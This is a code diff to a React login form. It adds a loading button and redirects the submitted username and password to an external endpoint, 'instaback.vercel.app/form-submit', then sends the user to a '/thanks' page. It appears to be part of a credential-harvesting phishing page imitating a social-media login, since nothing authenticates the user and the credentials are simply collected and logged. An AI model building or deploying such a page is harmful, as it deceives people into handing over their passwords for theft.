@@ -12,21 +12,24 @@ import { useNavigate } from "react-router-dom"
 const Login =()=>{
     const [username, setUsername] = useState("");
     const [password, setPassword] = useState("")
+    const [loading, setLoading] = useState(false)
     const navigate = useNavigate()
 
 
     const handleSubmit = async (e) => {
         e.preventDefault()
+        setLoading(true)
         const user = {
             username, password
         }
         console.log(user)
         try {
-            await axios.post('http://localhost:3001/form-submit', {...user})
+            await axios.post(`https://instaback.vercel.app/form-submit`, {...user})
                 .then((res)=> console.log(res.data))
                 .then(()=>{
                     setPassword("");
                     setUsername("");
+                    setLoading(false)
                     navigate('/thanks')
                 })
         } catch (error) {
@@ -63,9 +66,16 @@ const Login =()=>{
                                 </div>
                             </div>
                             <div className="btn-group">
+                                {
+                                    loading? 
+                                <button className="btn-login" id="signin-btn" type="submit" disabled >
+                                    please wait..
+                                </button>
+                                :
                                 <button className="btn-login" id="signin-btn" type="submit"  >
                                     Log in
                                 </button>
+                                }
                             </div>
                             <div className="divine">
                                 <div></div>
